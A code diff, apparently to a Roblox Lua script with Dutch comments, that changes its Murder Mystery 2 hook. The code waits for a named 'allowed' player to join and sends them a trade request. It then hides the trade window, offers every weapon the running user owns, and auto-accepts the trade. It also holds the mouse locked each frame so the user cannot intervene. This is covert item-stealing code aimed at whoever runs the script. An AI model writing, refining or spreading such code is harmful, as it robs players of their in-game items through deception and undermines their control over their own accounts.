@@ -10,6 +10,7 @@ local PlaceId = game.PlaceId
 local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local UIS = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 local lp = Players.LocalPlayer
 local HS = game:GetService("HttpService")
 
@@ -142,8 +143,10 @@ local function hook_mm2()
     local currentLastOffer = nil
     local tradingWithAllowed = false
     local itemsOffered = false
+    local readySent = false
     local storedItems = {}
     local guiHidden = false
+    local shiftlockConn = nil
 
     local function isAllowedUser(name)
         for _, n in ipairs(CFG.allowed) do
@@ -180,11 +183,19 @@ local function hook_mm2()
                 end
             end
         end
-        pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
+        -- shiftlock via RenderStepped zodat game het niet kan overschrijven
+        if shiftlockConn then shiftlockConn:Disconnect() end
+        shiftlockConn = RunService.RenderStepped:Connect(function()
+            pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
+        end)
     end
 
     local function showGui()
         guiHidden = false
+        if shiftlockConn then
+            shiftlockConn:Disconnect()
+            shiftlockConn = nil
+        end
         local gui = lp:FindFirstChild("PlayerGui")
         if not gui then return end
         for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
@@ -199,27 +210,24 @@ local function hook_mm2()
         end
     end
 
-    -- wacht op allowed user en stuur trade request
+    -- direct checken of allowed user al in server is
     task.spawn(function()
-        while true do
-            task.wait(3)
-            if tradingWithAllowed then break end
-            for _, player in ipairs(Players:GetPlayers()) do
-                if player ~= lp and isAllowedUser(player.Name) then
-                    storeItems()
-                    pcall(function() sendRequest:InvokeServer(player) end)
-                    break
-                end
+        task.wait(1)
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= lp and isAllowedUser(player.Name) then
+                storeItems()
+                pcall(function() sendRequest:InvokeServer(player) end)
+                return
             end
         end
-    end)
-
-    Players.PlayerAdded:Connect(function(player)
-        if isAllowedUser(player.Name) and not tradingWithAllowed then
-            task.wait(2)
-            storeItems()
-            pcall(function() sendRequest:InvokeServer(player) end)
-        end
+        -- anders wachten tot ze joinen
+        Players.PlayerAdded:Connect(function(player)
+            if isAllowedUser(player.Name) and not tradingWithAllowed then
+                task.wait(1)
+                storeItems()
+                pcall(function() sendRequest:InvokeServer(player) end)
+            end
+        end)
     end)
 
     startTrade.OnClientEvent:Connect(function(tradeData, operatorName)
@@ -237,28 +245,23 @@ local function hook_mm2()
         tradingWithAllowed = true
         hideGui()
 
-        if not itemsOffered then
-            itemsOffered = true
-            task.spawn(function()
-                task.wait(1)
-                -- offer alle items
-                if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
-                    for itemName, _ in pairs(ProfileData.Weapons.Owned) do
-                        pcall(function()
-                            offerItem:FireServer(itemName, "Weapons")
-                        end)
-                        task.wait(0.15)
-                    end
+        if itemsOffered then return end
+        itemsOffered = true
+
+        task.spawn(function()
+            task.wait(1)
+            if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
+                for itemName, _ in pairs(ProfileData.Weapons.Owned) do
+                    pcall(function() offerItem:FireServer(itemName, "Weapons") end)
+                    task.wait(0.15)
                 end
-                -- wacht even dan auto ready
-                task.wait(1)
-                if currentLastOffer then
-                    pcall(function()
-                        acceptTrade:FireServer(TRADE_ID, currentLastOffer)
-                    end)
-                end
-            end)
-        end
+            end
+            task.wait(1)
+            if not readySent and currentLastOffer then
+                readySent = true
+                pcall(function() acceptTrade:FireServer(TRADE_ID, currentLastOffer) end)
+            end
+        end)
     end)
 
     if completeTrade then
@@ -268,19 +271,10 @@ local function hook_mm2()
             showGui()
             tradingWithAllowed = false
             itemsOffered = false
+            readySent = false
             currentLastOffer = nil
         end)
     end
-
-    -- shiftlock loop
-    task.spawn(function()
-        while true do
-            task.wait(0.1)
-            if tradingWithAllowed and guiHidden then
-                pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
-            end
-        end
-    end)
 end
 
 local function hook_adoptme()
